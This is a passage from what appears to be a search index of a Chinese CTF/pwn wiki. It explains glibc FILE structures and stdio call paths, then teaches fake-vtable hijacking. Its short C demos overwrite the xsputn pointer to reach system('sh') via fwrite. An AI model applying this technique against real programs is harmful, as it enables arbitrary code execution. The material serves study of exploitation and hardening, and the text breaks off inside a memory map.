(fp);\n\n\n\n\nprintf/puts\n\n\nprintf\u548cputs\u662f\u5e38\u7528\u7684\u8f93\u51fa\u51fd\u6570\uff0c\u5728printf\u7684\u53c2\u6570\u662f\u4ee5'\\n'\u7ed3\u675f\u7684\u7eaf\u5b57\u7b26\u4e32\u65f6\uff0cprintf\u4f1a\u88ab\u4f18\u5316\u4e3aputs\u51fd\u6570\u5e76\u53bb\u9664\u6362\u884c\u7b26\u3002\n\n\nputs\u5728\u6e90\u7801\u4e2d\u5b9e\u73b0\u7684\u51fd\u6570\u662f_IO_puts\uff0c\u8fd9\u4e2a\u51fd\u6570\u7684\u64cd\u4f5c\u4e0efwrite\u7684\u6d41\u7a0b\u5927\u81f4\u76f8\u540c\uff0c\u51fd\u6570\u5185\u90e8\u540c\u6837\u4f1a\u8c03\u7528vtable\u4e2d\u7684_IO_sputn\uff0c\u7ed3\u679c\u4f1a\u6267\u884c_IO_new_file_xsputn\uff0c\u6700\u540e\u4f1a\u8c03\u7528\u5230\u7cfb\u7edf\u63a5\u53e3write\u51fd\u6570\u3002\n\n\nprintf\u7684\u8c03\u7528\u6808\u56de\u6eaf\u5982\u4e0b\uff0c\u540c\u6837\u662f\u901a\u8fc7_IO_file_xsputn\u5b9e\u73b0\n\n\nvfprintf+11\n_IO_file_xsputn\n_IO_file_overflow\nfunlockfile\n_IO_file_write\nwrite", 
            "title": "FILE \u6587\u4ef6\u7ed3\u6784\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/io_file/introduction/#file", 
            "text": "", 
            "title": "FILE\u7ed3\u6784"
        }, 
        {
            "location": "/pwn/io_file/introduction/#file_1", 
            "text": "FILE\u5728Linux\u7cfb\u7edf\u7684\u6807\u51c6IO\u5e93\u4e2d\u662f\u7528\u4e8e\u63cf\u8ff0\u6587\u4ef6\u7684\u7ed3\u6784\uff0c\u79f0\u4e3a\u6587\u4ef6\u6d41\u3002\nFILE\u7ed3\u6784\u5728\u7a0b\u5e8f\u6267\u884cfopen\u7b49\u51fd\u6570\u65f6\u4f1a\u8fdb\u884c\u521b\u5efa\uff0c\u5e76\u5206\u914d\u5728\u5806\u4e2d\u3002\u6211\u4eec\u5e38\u5b9a\u4e49\u4e00\u4e2a\u6307\u5411FILE\u7ed3\u6784\u7684\u6307\u9488\u6765\u63a5\u6536\u8fd9\u4e2a\u8fd4\u56de\u503c\u3002  FILE\u7ed3\u6784\u5b9a\u4e49\u5728libio.h\u4e2d\uff0c\u5982\u4e0b\u6240\u793a  struct _IO_FILE {\n  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */\n#define _IO_file_flags _flags\n\n  /* The following pointers correspond to the C++ streambuf protocol. */\n  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */\n  char* _IO_read_ptr;   /* Current read pointer */\n  char* _IO_read_end;   /* End of get area. */\n  char* _IO_read_base;  /* Start of putback+get area. */\n  char* _IO_write_base; /* Start of put area. */\n  char* _IO_write_ptr;  /* Current put pointer. */\n  char* _IO_write_end;  /* End of put area. */\n  char* _IO_buf_base;   /* Start of reserve area. */\n  char* _IO_buf_end;    /* End of reserve area. */\n  /* The following fields are used to support backing up and undo. */\n  char *_IO_save_base; /* Pointer to start of non-current get area. */\n  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n  char *_IO_save_end; /* Pointer to end of non-current get area. */\n\n  struct _IO_marker *_markers;\n\n  struct _IO_FILE *_chain;\n\n  int _fileno;\n#if 0\n  int _blksize;\n#else\n  int _flags2;\n#endif\n  _IO_off_t _old_offset; /* This used to be _offset but it s too small.  */\n\n#define __HAVE_COLUMN /* temporary */\n  /* 1+column number of pbase(); 0 is unknown. */\n  unsigned short _cur_column;\n  signed char _vtable_offset;\n  char _shortbuf[1];\n\n  /*  char* _save_gptr;  char* _save_egptr; */\n\n  _IO_lock_t *_lock;\n#ifdef _IO_USE_OLD_IO_FILE\n};  \u8fdb\u7a0b\u4e2d\u7684FILE\u7ed3\u6784\u4f1a\u901a\u8fc7_chain\u57df\u5f7c\u6b64\u8fde\u63a5\u5f62\u6210\u4e00\u4e2a\u94fe\u8868\uff0c\u94fe\u8868\u5934\u90e8\u7528\u5168\u5c40\u53d8\u91cf_IO_list_all\u8868\u793a\uff0c\u901a\u8fc7\u8fd9\u4e2a\u503c\u6211\u4eec\u53ef\u4ee5\u904d\u5386\u6240\u6709\u7684FILE\u7ed3\u6784\u3002  \u5728\u6807\u51c6I/O\u5e93\u4e2d\uff0c\u6bcf\u4e2a\u7a0b\u5e8f\u542f\u52a8\u65f6\u6709\u4e09\u4e2a\u6587\u4ef6\u6d41\u662f\u81ea\u52a8\u6253\u5f00\u7684\uff1astdin\u3001stdout\u3001stderr\u3002\u56e0\u6b64\u5728\u521d\u59cb\u72b6\u6001\u4e0b\uff0c_IO_list_all\u6307\u5411\u4e86\u4e00\u4e2a\u6709\u8fd9\u4e9b\u6587\u4ef6\u6d41\u6784\u6210\u7684\u94fe\u8868\uff0c\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u4e09\u4e2a\u6587\u4ef6\u6d41\u4f4d\u4e8elibc.so\u7684\u6570\u636e\u6bb5\u3002\u800c\u6211\u4eec\u4f7f\u7528fopen\u521b\u5efa\u7684\u6587\u4ef6\u6d41\u662f\u5206\u914d\u5728\u5806\u5185\u5b58\u4e0a\u7684\u3002  \u6211\u4eec\u53ef\u4ee5\u5728libc.so\u4e2d\u627e\u5230stdin\\stdout\\stderr\u7b49\u7b26\u53f7\uff0c\u8fd9\u4e9b\u7b26\u53f7\u662f\u6307\u5411FILE\u7ed3\u6784\u7684\u6307\u9488\uff0c\u771f\u6b63\u7ed3\u6784\u7684\u7b26\u53f7\u662f  _IO_2_1_stderr_\n_IO_2_1_stdout_\n_IO_2_1_stdin_  \u4f46\u662f\u4e8b\u5b9e\u4e0a_IO_FILE\u7ed3\u6784\u5916\u5305\u88f9\u7740\u53e6\u4e00\u79cd\u7ed3\u6784_IO_FILE_plus\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u4e00\u4e2a\u91cd\u8981\u7684\u6307\u9488vtable\u6307\u5411\u4e86\u4e00\u7cfb\u5217\u51fd\u6570\u6307\u9488\u3002  \u5728libc2.23\u7248\u672c\u4e0b\uff0c32\u4f4d\u7684vtable\u504f\u79fb\u4e3a0x94\uff0c64\u4f4d\u504f\u79fb\u4e3a0x228  struct _IO_FILE_plus\n{\n    _IO_FILE    file;\n    IO_jump_t   *vtable;\n}  vtable\u662fIO_jump_t\u7c7b\u578b\u7684\u6307\u9488\uff0cIO_jump_t\u4e2d\u4fdd\u5b58\u4e86\u4e00\u4e9b\u51fd\u6570\u6307\u9488\uff0c\u5728\u540e\u9762\u6211\u4eec\u4f1a\u770b\u5230\u5728\u4e00\u7cfb\u5217\u6807\u51c6IO\u51fd\u6570\u4e2d\u4f1a\u8c03\u7528\u8fd9\u4e9b\u51fd\u6570\u6307\u9488  void\u00a0*\u00a0funcs[]\u00a0=\u00a0{\n\u00a0\u00a0\u00a01\u00a0NULL,\u00a0//\u00a0 extra\u00a0word \n\u00a0\u00a0\u00a02\u00a0NULL,\u00a0//\u00a0DUMMY\n\u00a0\u00a0\u00a03\u00a0exit,\u00a0//\u00a0finish\n\u00a0\u00a0\u00a04\u00a0NULL,\u00a0//\u00a0overflow\n\u00a0\u00a0\u00a05\u00a0NULL,\u00a0//\u00a0underflow\n\u00a0\u00a0\u00a06\u00a0NULL,\u00a0//\u00a0uflow\n\u00a0\u00a0\u00a07\u00a0NULL,\u00a0//\u00a0pbackfail\n\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a08\u00a0NULL,\u00a0//\u00a0xsputn  #printf\n\u00a0\u00a0\u00a09\u00a0NULL,\u00a0//\u00a0xsgetn\n\u00a0\u00a0\u00a010\u00a0NULL,\u00a0//\u00a0seekoff\n\u00a0\u00a0\u00a011\u00a0NULL,\u00a0//\u00a0seekpos\n\u00a0\u00a0\u00a012\u00a0NULL,\u00a0//\u00a0setbuf\n\u00a0\u00a0\u00a013\u00a0NULL,\u00a0//\u00a0sync\n\u00a0\u00a0\u00a014\u00a0NULL,\u00a0//\u00a0doallocate\n\u00a0\u00a0\u00a015\u00a0NULL,\u00a0//\u00a0read\n\u00a0\u00a0\u00a016\u00a0NULL,\u00a0//\u00a0write\n\u00a0\u00a0\u00a017\u00a0NULL,\u00a0//\u00a0seek\n\u00a0\u00a0\u00a018\u00a0pwn,\u00a0\u00a0//\u00a0close\n\u00a0\u00a0\u00a019\u00a0NULL,\u00a0//\u00a0stat\n\u00a0\u00a0\u00a020\u00a0NULL,\u00a0//\u00a0showmanyc\n\u00a0\u00a0\u00a021\u00a0NULL,\u00a0//\u00a0imbue\n};", 
            "title": "FILE\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/io_file/introduction/#fread", 
            "text": "fread\u662f\u6807\u51c6IO\u5e93\u51fd\u6570\uff0c\u4f5c\u7528\u662f\u4ece\u6587\u4ef6\u6d41\u4e2d\u8bfb\u6570\u636e\uff0c\u51fd\u6570\u539f\u578b\u5982\u4e0b  size_t fread ( void *buffer, size_t size, size_t count, FILE *stream) ;    buffer \u5b58\u653e\u8bfb\u53d6\u6570\u636e\u7684\u7f13\u51b2\u533a\u3002    size\uff1a\u6307\u5b9a\u6bcf\u4e2a\u8bb0\u5f55\u7684\u957f\u5ea6\u3002    count\uff1a \u6307\u5b9a\u8bb0\u5f55\u7684\u4e2a\u6570\u3002    stream\uff1a\u76ee\u6807\u6587\u4ef6\u6d41\u3002    \u8fd4\u56de\u503c\uff1a\u8fd4\u56de\u8bfb\u53d6\u5230\u6570\u636e\u7f13\u51b2\u533a\u4e2d\u7684\u8bb0\u5f55\u4e2a\u6570    dread\u7684\u4ee3\u7801\u4f4d\u4e8e/libio/iofread.c\u4e2d\uff0c\u51fd\u6570\u540d\u4e3a_IO_fread\uff0c\u4f46\u771f\u6b63\u7684\u529f\u80fd\u5b9e\u73b0\u5728\u5b50\u51fd\u6570_IO_sgetn\u4e2d\u3002  _IO_size_t\n_IO_fread (buf, size, count, fp)\n     void *buf;\n     _IO_size_t size;\n     _IO_size_t count;\n     _IO_FILE *fp;\n{\n  ...\n  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);\n  ...\n}  \u5728_IO_sgetn\u51fd\u6570\u4e2d\u4f1a\u8c03\u7528_IO_XSGETN\uff0c\u800c_IO_XSGETN\u662f_IO_FILE_plus.vtable\u4e2d\u7684\u51fd\u6570\u6307\u9488\uff0c\u5728\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u65f6\u4f1a\u9996\u5148\u53d6\u51favtable\u4e2d\u7684\u6307\u9488\u7136\u540e\u518d\u8fdb\u884c\u8c03\u7528\u3002  _IO_size_t\n_IO_sgetn (fp, data, n)\n     _IO_FILE *fp;\n     void *data;\n     _IO_size_t n;\n{\n  return _IO_XSGETN (fp, data, n);\n}  \u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u51fd\u6570\u6307\u9488\u662f\u6307\u5411_IO_file_xsgetn\u51fd\u6570\u7684\uff0c    if (fp- _IO_buf_base\n            want   (size_t) (fp- _IO_buf_end - fp- _IO_buf_base))\n        {\n          if (__underflow (fp) == EOF)\n        break;\n\n          continue;\n        }", 
            "title": "fread"
        }, 
        {
            "location": "/pwn/io_file/introduction/#fwrite", 
            "text": "fwrite\u540c\u6837\u662f\u6807\u51c6IO\u5e93\u51fd\u6570\uff0c\u4f5c\u7528\u662f\u5411\u6587\u4ef6\u6d41\u5199\u5165\u6570\u636e\uff0c\u51fd\u6570\u539f\u578b\u5982\u4e0b  size_t fwrite(const void* buffer, size_t size, size_t count, FILE* stream);    buffer:\u662f\u4e00\u4e2a\u6307\u9488\uff0c\u5bf9fwrite\u6765\u8bf4\uff0c\u662f\u8981\u5199\u5165\u6570\u636e\u7684\u5730\u5740;    size:\u8981\u5199\u5165\u5185\u5bb9\u7684\u5355\u5b57\u8282\u6570;    count:\u8981\u8fdb\u884c\u5199\u5165size\u5b57\u8282\u7684\u6570\u636e\u9879\u7684\u4e2a\u6570;    stream:\u76ee\u6807\u6587\u4ef6\u6307\u9488;    \u8fd4\u56de\u503c\uff1a\u5b9e\u9645\u5199\u5165\u7684\u6570\u636e\u9879\u4e2a\u6570count\u3002    fwrite\u7684\u4ee3\u7801\u4f4d\u4e8e/libio/iofwrite.c\u4e2d\uff0c\u51fd\u6570\u540d\u4e3a_IO_fwrite\u3002\n\u5728_IO_fwrite\u4e2d\u4e3b\u8981\u662f\u8c03\u7528_IO_XSPUTN\u6765\u5b9e\u73b0\u5199\u5165\u7684\u529f\u80fd\u3002  \u6839\u636e\u524d\u9762\u5bf9_IO_FILE_plus\u7684\u4ecb\u7ecd\uff0c\u53ef\u77e5_IO_XSPUTN\u4f4d\u4e8e_IO_FILE_plus\u7684vtable\u4e2d\uff0c\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u9700\u8981\u9996\u5148\u53d6\u51favtable\u4e2d\u7684\u6307\u9488\uff0c\u518d\u8df3\u8fc7\u53bb\u8fdb\u884c\u8c03\u7528\u3002  written = _IO_sputn (fp, (const char *) buf, request);  \u5728_IO_XSPUTN\u5bf9\u5e94\u7684\u9ed8\u8ba4\u51fd\u6570_IO_new_file_xsputn\u4e2d\u4f1a\u8c03\u7528\u540c\u6837\u4f4d\u4e8evtable\u4e2d\u7684_IO_OVERFLOW   /* Next flush the (full) buffer. */\n      if (_IO_OVERFLOW (f, EOF) == EOF)  _IO_OVERFLOW\u9ed8\u8ba4\u5bf9\u5e94\u7684\u51fd\u6570\u662f_IO_new_file_overflow  if (ch == EOF)\n    return _IO_do_write (f, f- _IO_write_base,\n             f- _IO_write_ptr - f- _IO_write_base);\n  if (f- _IO_write_ptr == f- _IO_buf_end ) /* Buffer is really full */\n    if (_IO_do_flush (f) == EOF)\n      return EOF; \n\u5728_IO_new_file_overflow\u5185\u90e8\u6700\u7ec8\u4f1a\u8c03\u7528\u7cfb\u7edf\u63a5\u53e3write\u51fd\u6570", 
            "title": "fwrite"
        }, 
        {
            "location": "/pwn/io_file/introduction/#fopen", 
            "text": "fopen\u5728\u6807\u51c6IO\u5e93\u4e2d\u7528\u4e8e\u6253\u5f00\u6587\u4ef6\uff0c\u51fd\u6570\u539f\u578b\u5982\u4e0b  FILE *fopen(char *filename, *type);    filename:\u76ee\u6807\u6587\u4ef6\u7684\u8def\u5f84    type:\u6253\u5f00\u65b9\u5f0f\u7684\u7c7b\u578b    \u8fd4\u56de\u503c:\u8fd4\u56de\u4e00\u4e2a\u6587\u4ef6\u6307\u9488    \u5728fopen\u5185\u90e8\u4f1a\u521b\u5efaFILE\u7ed3\u6784\u5e76\u8fdb\u884c\u4e00\u4e9b\u521d\u59cb\u5316\u64cd\u4f5c\uff0c\u4e0b\u9762\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u8fc7\u7a0b  \u9996\u5148\u5728fopen\u5bf9\u5e94\u7684\u51fd\u6570__fopen_internal\u5185\u90e8\u4f1a\u8c03\u7528malloc\u51fd\u6570\uff0c\u5206\u914dFILE\u7ed3\u6784\u7684\u7a7a\u95f4\u3002\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u83b7\u77e5FILE\u7ed3\u6784\u662f\u5b58\u50a8\u5728\u5806\u4e0a\u7684  *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));  \u4e4b\u540e\u4f1a\u4e3a\u521b\u5efa\u7684FILE\u521d\u59cb\u5316vtable\uff0c\u5e76\u8c03\u7528_IO_file_init\u8fdb\u4e00\u6b65\u521d\u59cb\u5316\u64cd\u4f5c _IO_JUMPS ( new_f- fp) =  _IO_file_jumps;\n_IO_file_init ( new_f- fp);  \u5728_IO_file_init\u51fd\u6570\u7684\u521d\u59cb\u5316\u64cd\u4f5c\u4e2d\uff0c\u4f1a\u8c03\u7528_IO_link_in\u628a\u65b0\u5206\u914d\u7684FILE\u94fe\u5165_IO_list_all\u4e3a\u8d77\u59cb\u7684FILE\u94fe\u8868\u4e2d void\n_IO_link_in (fp)\n     struct _IO_FILE_plus *fp;\n{\n    if ((fp- file._flags   _IO_LINKED) == 0)\n    {\n      fp- file._flags |= _IO_LINKED;\n      fp- file._chain = (_IO_FILE *) _IO_list_all;\n      _IO_list_all = fp;\n      ++_IO_list_all_stamp;\n    }\n}  \u4e4b\u540e__fopen_internal\u51fd\u6570\u4f1a\u8c03\u7528_IO_file_fopen\u51fd\u6570\u6253\u5f00\u76ee\u6807\u6587\u4ef6\uff0c_IO_file_fopen\u4f1a\u6839\u636e\u7528\u6237\u4f20\u5165\u7684\u6253\u5f00\u6a21\u5f0f\u8fdb\u884c\u6253\u5f00\u64cd\u4f5c\uff0c\u603b\u4e4b\u6700\u540e\u4f1a\u8c03\u7528\u5230\u7cfb\u7edf\u63a5\u53e3open\u51fd\u6570\uff0c\u8fd9\u91cc\u4e0d\u518d\u6df1\u5165\u3002 if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL)\n    return __fopen_maybe_mmap ( new_f- fp.file);  \u603b\u7ed3\u4e00\u4e0bfopen\u7684\u64cd\u4f5c\u662f   \u4f7f\u7528malloc\u5206\u914dFILE\u7ed3\u6784  \u8bbe\u7f6eFILE\u7ed3\u6784\u7684vtable  \u521d\u59cb\u5316\u5206\u914d\u7684FILE\u7ed3\u6784  \u5c06\u521d\u59cb\u5316\u7684FILE\u7ed3\u6784\u94fe\u5165FILE\u7ed3\u6784\u94fe\u8868\u4e2d  \u8c03\u7528\u7cfb\u7edf\u8c03\u7528\u6253\u5f00\u6587\u4ef6", 
            "title": "fopen"
        }, 
        {
            "location": "/pwn/io_file/introduction/#fclose", 
            "text": "fclose\u662f\u6807\u51c6IO\u5e93\u4e2d\u7528\u4e8e\u5173\u95ed\u5df2\u6253\u5f00\u6587\u4ef6\u7684\u51fd\u6570\uff0c\u5176\u4f5c\u7528\u4e0efopen\u76f8\u53cd\u3002  int fclose(FILE *stream) \n\u529f\u80fd\uff1a\u5173\u95ed\u4e00\u4e2a\u6587\u4ef6\u6d41\uff0c\u4f7f\u7528fclose\u5c31\u53ef\u4ee5\u628a\u7f13\u51b2\u533a\u5185\u6700\u540e\u5269\u4f59\u7684\u6570\u636e\u8f93\u51fa\u5230\u78c1\u76d8\u6587\u4ef6\u4e2d\uff0c\u5e76\u91ca\u653e\u6587\u4ef6\u6307\u9488\u548c\u6709\u5173\u7684\u7f13\u51b2\u533a  fclose\u9996\u5148\u4f1a\u8c03\u7528_IO_unlink_it\u5c06\u6307\u5b9a\u7684FILE\u4ece_chain\u94fe\u8868\u4e2d\u8131\u94fe  if (fp- _IO_file_flags   _IO_IS_FILEBUF)\n    _IO_un_link ((struct _IO_FILE_plus *) fp);  \u4e4b\u540e\u4f1a\u8c03\u7528_IO_file_close_it\u51fd\u6570\uff0c_IO_file_close_it\u4f1a\u8c03\u7528\u7cfb\u7edf\u63a5\u53e3close\u5173\u95ed\u6587\u4ef6  if (fp- _IO_file_flags   _IO_IS_FILEBUF)\n    status = _IO_file_close_it (fp);  \u6700\u540e\u8c03\u7528vtable\u4e2d\u7684_IO_FINISH\uff0c\u5176\u5bf9\u5e94\u7684\u662f_IO_file_finish\u51fd\u6570\uff0c\u5176\u4e2d\u4f1a\u8c03\u7528free\u51fd\u6570\u91ca\u653e\u4e4b\u524d\u5206\u914d\u7684FILE\u7ed3\u6784  _IO_FINISH (fp);", 
            "title": "fclose"
        }, 
        {
            "location": "/pwn/io_file/introduction/#printfputs", 
            "text": "printf\u548cputs\u662f\u5e38\u7528\u7684\u8f93\u51fa\u51fd\u6570\uff0c\u5728printf\u7684\u53c2\u6570\u662f\u4ee5'\\n'\u7ed3\u675f\u7684\u7eaf\u5b57\u7b26\u4e32\u65f6\uff0cprintf\u4f1a\u88ab\u4f18\u5316\u4e3aputs\u51fd\u6570\u5e76\u53bb\u9664\u6362\u884c\u7b26\u3002  puts\u5728\u6e90\u7801\u4e2d\u5b9e\u73b0\u7684\u51fd\u6570\u662f_IO_puts\uff0c\u8fd9\u4e2a\u51fd\u6570\u7684\u64cd\u4f5c\u4e0efwrite\u7684\u6d41\u7a0b\u5927\u81f4\u76f8\u540c\uff0c\u51fd\u6570\u5185\u90e8\u540c\u6837\u4f1a\u8c03\u7528vtable\u4e2d\u7684_IO_sputn\uff0c\u7ed3\u679c\u4f1a\u6267\u884c_IO_new_file_xsputn\uff0c\u6700\u540e\u4f1a\u8c03\u7528\u5230\u7cfb\u7edf\u63a5\u53e3write\u51fd\u6570\u3002  printf\u7684\u8c03\u7528\u6808\u56de\u6eaf\u5982\u4e0b\uff0c\u540c\u6837\u662f\u901a\u8fc7_IO_file_xsputn\u5b9e\u73b0  vfprintf+11\n_IO_file_xsputn\n_IO_file_overflow\nfunlockfile\n_IO_file_write\nwrite", 
            "title": "printf/puts"
        }, 
        {
            "location": "/pwn/io_file/fake-vtable-exploit/", 
            "text": "\u4f2a\u9020vtable\u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b\n\n\n\u7b80\u4ecb\n\n\n\u524d\u9762\u6211\u4eec\u4ecb\u7ecd\u4e86Linux\u4e2d\u6587\u4ef6\u6d41\u7684\u7279\u6027\uff08FILE\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u77e5Linux\u4e2d\u7684\u4e00\u4e9b\u5e38\u89c1\u7684IO\u64cd\u4f5c\u51fd\u6570\u90fd\u9700\u8981\u7ecf\u8fc7FILE\u7ed3\u6784\u8fdb\u884c\u5904\u7406\u3002\u5c24\u5176\u662f_IO_FILE_plus\u7ed3\u6784\u4e2d\u5b58\u5728vtable\uff0c\u4e00\u4e9b\u51fd\u6570\u4f1a\u53d6\u51favtable\u4e2d\u7684\u6307\u9488\u8fdb\u884c\u8c03\u7528\u3002\n\n\n\u56e0\u6b64\u4f2a\u9020vtable\u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b\u7684\u4e2d\u5fc3\u601d\u60f3\u5c31\u662f\u9488\u5bf9_IO_FILE_plus\u7684vtable\u52a8\u624b\u811a\uff0c\u901a\u8fc7\u628avtable\u6307\u5411\u6211\u4eec\u63a7\u5236\u7684\u5185\u5b58\uff0c\u5e76\u5728\u5176\u4e2d\u5e03\u7f6e\u51fd\u6570\u6307\u9488\u6765\u5b9e\u73b0\u3002\n\n\n\u56e0\u6b64vtable\u52ab\u6301\u5206\u4e3a\u4e24\u79cd\uff0c\u4e00\u79cd\u662f\u76f4\u63a5\u6539\u5199vtable\u4e2d\u7684\u51fd\u6570\u6307\u9488\uff0c\u901a\u8fc7\u4efb\u610f\u5730\u5740\u5199\u5c31\u53ef\u4ee5\u5b9e\u73b0\u3002\u53e6\u4e00\u79cd\u662f\u8986\u76d6vtable\u7684\u6307\u9488\u6307\u5411\u6211\u4eec\u63a7\u5236\u7684\u5185\u5b58\uff0c\u7136\u540e\u5728\u5176\u4e2d\u5e03\u7f6e\u51fd\u6570\u6307\u9488\u3002\n\n\n\u5b9e\u8df5\n\n\n\u8fd9\u91cc\u6f14\u793a\u4e86\u4fee\u6539vtable\u4e2d\u7684\u6307\u9488\uff0c\u9996\u5148\u9700\u8981\u77e5\u9053_IO_FILE_plus\u4f4d\u4e8e\u54ea\u91cc\uff0c\u5bf9\u4e8efopen\u7684\u60c5\u51b5\u4e0b\u662f\u4f4d\u4e8e\u5806\u5185\u5b58\uff0c\u5bf9\u4e8estdin\\stdout\\stderr\u662f\u4f4d\u4e8elibc.so\u4e2d\u3002\n\n\nint main(void)\n{\n    FILE *fp;\n    long long *vtable_ptr;\n    fp=fopen(\n123.txt\n,\nrw\n);\n    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable\n\n    vtable_ptr[7]=0x41414141 //xsputn\n\n    printf(\ncall 0x41414141\n);\n}\n\n\n\n\n\u6839\u636evtable\u5728_IO_FILE_plus\u7684\u504f\u79fb\u5f97\u5230vtable\u7684\u5730\u5740\uff0c\u572864\u4f4d\u7cfb\u7edf\u4e0b\u504f\u79fb\u662f0xd8\u3002\u4e4b\u540e\u9700\u8981\u641e\u6e05\u695a\u6b32\u52ab\u6301\u7684IO\u51fd\u6570\u4f1a\u8c03\u7528vtable\u4e2d\u7684\u54ea\u4e2a\u51fd\u6570\u3002\u5173\u4e8eIO\u51fd\u6570\u8c03\u7528vtable\u7684\u60c5\u51b5\u5df2\u7ecf\u5728FILE\u7ed3\u6784\u4ecb\u7ecd\u4e00\u8282\u7ed9\u51fa\u4e86\uff0c\u77e5\u9053\u4e86printf\u4f1a\u8c03\u7528vtable\u4e2d\u7684xsputn\uff0c\u5e76\u4e14xsputn\u7684\u662fvtable\u4e2d\u7b2c\u516b\u9879\u4e4b\u540e\u5c31\u53ef\u4ee5\u5199\u5165\u8fd9\u4e2a\u6307\u9488\u8fdb\u884c\u52ab\u6301\u3002\n\n\n\u5e76\u4e14\u5728xsputn\u7b49vtable\u51fd\u6570\u8fdb\u884c\u8c03\u7528\u65f6\uff0c\u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5176\u5b9e\u662f\u5bf9\u5e94\u7684_IO_FILE_plus\u5730\u5740\u3002\u6bd4\u5982\u8fd9\u4f8b\u5b50\u8c03\u7528printf\uff0c\u4f20\u9012\u7ed9vtable\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5c31\u662f_IO_2_1_stdout_\u7684\u5730\u5740\u3002\n\n\n\u5229\u7528\u8fd9\u70b9\u53ef\u4ee5\u5b9e\u73b0\u7ed9\u52ab\u6301\u7684vtable\u51fd\u6570\u4f20\u53c3\uff0c\u6bd4\u5982\n\n\n#define system_ptr 0x7ffff7a52390;\n\nint main(void)\n{\n    FILE *fp;\n    long long *vtable_ptr;\n    fp=fopen(\n123.txt\n,\nrw\n);\n    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable\n\n    memcopy(fp,\nsh\n,3);\n\n    vtable_ptr[7]=system_ptr //xsputn\n\n\n    fwrite(\nhi\n,2,1,fp);\n}\n\n\n\n\n\u4f46\u662f\u5728\u76ee\u524dlibc2.23\u7248\u672c\u4e0b\uff0c\u4f4d\u4e8elibc\u6570\u636e\u6bb5\u7684vtable\u662f\u4e0d\u53ef\u4ee5\u8fdb\u884c\u5199\u5165\u7684\u3002\u4e0d\u8fc7\uff0c\u901a\u8fc7\u5728\u53ef\u63a7\u7684\u5185\u5b58\u4e2d\u4f2a\u9020vtable\u7684\u65b9\u6cd5\u4f9d\u7136\u53ef\u4ee5\u5b9e\u73b0\u5229\u7528\u3002\n\n\n#define system_ptr 0x7ffff7a52390;\n\nint main(void)\n{\n    FILE *fp;\n    long long *vtable_addr,*fake_vtable;\n\n    fp=fopen(\n123.txt\n,\nrw\n);\n    fake_vtable=malloc(0x40);\n\n    vtable_addr=(long long *)((long long)fp+0xd8);     //vtable offset\n\n    vtable_addr[0]=(long long)fake_vtable;\n\n    memcpy(fp,\nsh\n,3);\n\n    fake_vtable[7]=system_ptr; //xsputn\n\n    fwrite(\nhi\n,2,1,fp);\n}\n\n\n\n\n\u6211\u4eec\u9996\u5148\u5206\u914d\u4e00\u6b3e\u5185\u5b58\u6765\u5b58\u653e\u4f2a\u9020\u7684vtable\uff0c\u4e4b\u540e\u4fee\u6539_IO_FILE_plus\u7684vtable\u6307\u9488\u6307\u5411\u8fd9\u5757\u5185\u5b58\u3002\u56e0\u4e3avtable\u4e2d\u7684\u6307\u9488\u6211\u4eec\u653e\u7f6e\u7684\u662fsystem\u51fd\u6570\u7684\u5730\u5740\uff0c\u56e0\u6b64\u9700\u8981\u4f20\u9012\u53c2\u6570\"/bin/sh\"\u6216\"sh\"\u3002\n\n\n\u56e0\u4e3avtable\u4e2d\u7684\u51fd\u6570\u8c03\u7528\u65f6\u4f1a\u628a\u5bf9\u5e94\u7684_IO_FILE_plus\u6307\u9488\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f20\u9012\uff0c\u56e0\u6b64\u8fd9\u91cc\u6211\u4eec\u628a\"sh\"\u5199\u5165_IO_FILE_plus\u5934\u90e8\u3002\u4e4b\u540e\u5bf9fwrite\u7684\u8c03\u7528\u5c31\u4f1a\u7ecf\u8fc7\u6211\u4eec\u4f2a\u9020\u7684vtable\u6267\u884csystem(\"sh\")\u3002\n\n\n\u540c\u6837\uff0c\u5982\u679c\u7a0b\u5e8f\u4e2d\u4e0d\u5b58\u5728fopen\u7b49\u51fd\u6570\u521b\u5efa\u7684_IO_FILE\u65f6\uff0c\u4e5f\u53ef\u4ee5\u9009\u62e9stdin\\stdout\\stderr\u7b49\u4f4d\u4e8elibc.so\u4e2d\u7684_IO_FILE\uff0c\u8fd9\u4e9b\u6d41\u5728printf\\scanf\u7b49\u51fd\u6570\u4e2d\u5c31\u4f1a\u88ab\u4f7f\u7528\u5230\u3002\u5728libc2.23\u4e4b\u524d\uff0c\u8fd9\u4e9bvtable\u662f\u53ef\u4ee5\u5199\u5165\u5e76\u4e14\u4e0d\u5b58\u5728\u5176\u4ed6\u68c0\u6d4b\u7684\u3002\n\n\nprint \n_IO_2_1_stdin_\n$2 = (struct _IO_FILE_plus *) 0x7ffff7dd18e0 \n_IO_2_1_stdin_\n\n\n0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dd1000 